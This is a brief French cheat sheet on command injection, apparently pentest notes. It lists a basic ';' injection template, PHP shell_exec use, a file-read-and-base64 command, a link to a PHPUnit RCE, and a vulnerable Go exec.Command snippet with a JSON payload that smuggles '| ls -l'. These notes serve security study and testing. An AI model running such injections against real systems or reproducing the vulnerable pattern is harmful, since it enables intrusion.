# Injections de commandes

### Basiques

```
; <CMD>
```

### PHP

Si `phpinfo()` fonctionne alors il est possible d'exécuter des commandes système avec `shell_exec('<CMD>')`.

```
# Lire un fichier est avoir le contenu encodé en base64
cat <PATH>/<FILE> | openssl base64

# Alternative à ./ pour exécuter un binaire
/bin/sh <EXECUTABLE>
```

#### Vulnérabilités connues

RCE sur PHPUnit 5.6.2 : [https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md](https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md).

### Go

```
# Exemple de code Go vulnérable
    cmd := exec.Command("sh", "-c", "cat " + animal)
# Injection via Burp
    "animal":"dog | ls -l"
```
